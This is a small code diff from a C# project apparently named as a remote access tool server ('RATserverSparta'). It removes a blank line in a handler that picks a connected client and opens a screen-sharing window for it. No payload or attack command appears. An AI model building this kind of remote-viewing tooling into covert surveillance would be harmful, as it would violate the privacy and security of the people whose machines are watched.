@@ -158,7 +158,6 @@ namespace RATserverSparta
                 string SelectedClientString = ClientsList.SelectedItems[ClientsList.SelectedItems.Count - 1].Text;
                 Client.Client Client = this.SocketAcceptClassInstance.ClientInstanceMap[SelectedClientString];
                 System.Net.Sockets.Socket SelectedClientSocket = this.SocketAcceptClassInstance.ClientSocketMap[SelectedClientString];
-
                 ScreenShare ScreenShare = new ScreenShare(Client, SelectedClientSocket);
                 ScreenShare.Show();
             }
